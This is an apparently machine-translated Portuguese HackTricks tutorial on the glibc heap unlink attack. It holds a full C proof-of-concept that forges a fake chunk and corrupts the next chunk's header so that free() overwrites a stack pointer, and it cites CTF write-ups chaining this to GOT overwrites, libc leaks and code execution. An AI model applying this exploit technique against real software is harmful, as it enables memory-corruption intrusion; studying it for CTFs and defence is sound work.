# Ataque Unlink

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Informa√ß√£o B√°sica

Quando este ataque foi descoberto, principalmente permitia um WWW (Write What Where), no entanto, alguns **checks foram adicionados** tornando a nova vers√£o do ataque mais interessante e mais complexa e **in√∫til**.

### Exemplo de C√≥digo:

<details>

<summary>C√≥digo</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* O ataque n√£o funciona se tcaches forem usados (ap√≥s 2.26)

### Objetivo

Este ataque permite **alterar um ponteiro para um chunk para apontar 3 endere√ßos antes de si mesmo**. Se este novo local (arredores onde o ponteiro estava localizado) tiver informa√ß√µes interessantes, como outras aloca√ß√µes control√°veis / pilha..., √© poss√≠vel ler/sobrescrev√™-las para causar um dano maior.

* Se este ponteiro estava localizado na pilha, porque agora est√° apontando 3 endere√ßos antes de si mesmo e o usu√°rio potencialmente pode l√™-lo e modific√°-lo, ser√° poss√≠vel vazar informa√ß√µes sens√≠veis da pilha ou at√© mesmo modificar o endere√ßo de retorno (talvez) sem tocar no can√°rio
* Em exemplos de CTF, este ponteiro est√° localizado em um array de ponteiros para outras aloca√ß√µes, portanto, fazendo-o apontar 3 endere√ßos antes e sendo capaz de ler e escrever nele, √© poss√≠vel fazer com que os outros ponteiros apontem para outros endere√ßos.\
Como potencialmente o usu√°rio pode ler/escrever tamb√©m as outras aloca√ß√µes, ele pode vazar informa√ß√µes ou sobrescrever novos endere√ßos em locais arbitr√°rios (como na GOT).

### Requisitos

* Algum controle em uma mem√≥ria (por exemplo, pilha) para criar um par de chunks dando valores a alguns dos atributos.
* Vazamento de pilha para definir os ponteiros do chunk falso.

### Ataque

* Existem um par de chunks (chunk1 e chunk2)
* O atacante controla o conte√∫do do chunk1 e os cabe√ßalhos do chunk2.
* No chunk1, o atacante cria a estrutura de um chunk falso:
* Para contornar prote√ß√µes, ele garante que o campo `size` est√° correto para evitar o erro: `corrupted size vs. prev_size while consolidating`
* e os campos `fd` e `bk` do chunk falso est√£o apontando para onde o ponteiro do chunk1 est√° armazenado com deslocamentos de -3 e -2 respectivamente, ent√£o `fake_chunk->fd->bk` e `fake_chunk->bk->fd` apontam para a posi√ß√£o na mem√≥ria (pilha) onde o endere√ßo real do chunk1 est√° localizado:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Os cabe√ßalhos do chunk2 s√£o modificados para indicar que o chunk anterior n√£o est√° em uso e que o tamanho √© o tamanho do chunk falso contido.
* Quando o segundo chunk √© liberado, ent√£o este chunk falso √© desvinculado acontecendo:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Anteriormente foi feito com que `fake_chunk->fd->bk` e `fake_chunk->fd->bk` apontassem para o mesmo lugar (a localiza√ß√£o na pilha onde `chunk1` estava armazenado, ent√£o era uma lista vinculada v√°lida). Como **ambos est√£o apontando para o mesmo local**, apenas o √∫ltimo (`fake_chunk->bk->fd = fake_chunk->fd`) ter√° **efeito**.
* Isso ir√° **sobrescrever o ponteiro para o chunk1 na pilha para o endere√ßo (ou bytes) armazenado 3 endere√ßos antes na pilha**.
* Portanto, se um atacante puder controlar o conte√∫do do chunk1 novamente, ele ser√° capaz de **escrever dentro da pilha**, podendo potencialmente sobrescrever o endere√ßo de retorno pulando o can√°rio e modificar os valores e ponteiros de vari√°veis locais. At√© mesmo modificando novamente o endere√ßo do chunk1 armazenado na pilha para um local diferente onde, se o atacante puder controlar novamente o conte√∫do do chunk1, ele ser√° capaz de escrever em qualquer lugar.
* Note que isso foi poss√≠vel porque os **endere√ßos s√£o armazenados na pilha**. O risco e a explora√ß√£o podem depender de **onde os endere√ßos para o chunk falso est√£o sendo armazenados**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Refer√™ncias

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* Embora seja estranho encontrar um ataque de unlink mesmo em um CTF, aqui est√£o alguns writeups onde esse ataque foi usado:
* Exemplo de CTF: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* Neste exemplo, em vez da pilha, h√° um array de endere√ßos malloc'ed. O ataque de unlink √© realizado para poder alocar um chunk aqui, sendo capaz de controlar os ponteiros do array de endere√ßos malloc'ed. Em seguida, h√° outra funcionalidade que permite modificar o conte√∫do dos chunks nesses endere√ßos, o que permite apontar endere√ßos para a GOT, modificar endere√ßos de fun√ß√µes para obter vazamentos e RCE.
* Outro exemplo de CTF: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
* Assim como no exemplo anterior, h√° um array de endere√ßos de aloca√ß√µes. √â poss√≠vel realizar um ataque de unlink para fazer o endere√ßo da primeira aloca√ß√£o apontar algumas posi√ß√µes antes de come√ßar o array e sobrescrever essa aloca√ß√£o na nova posi√ß√£o. Portanto, √© poss√≠vel sobrescrever ponteiros de outras aloca√ß√µes para apontar para a GOT de atoi, imprimi-la para obter um vazamento de libc e, em seguida, sobrescrever atoi GOT com o endere√ßo de um one gadget.
* Exemplo de CTF com fun√ß√µes malloc e free personalizadas que exploram uma vulnerabilidade muito semelhante ao ataque de unlink: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* H√° um estouro que permite controlar os ponteiros FD e BK do malloc personalizado que ser√° liberado (personalizado). Al√©m disso, o heap tem o bit exec, ent√£o √© poss√≠vel vazar um endere√ßo de heap e apontar uma fun√ß√£o da GOT para um chunk de heap com um shellcode para executar.

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
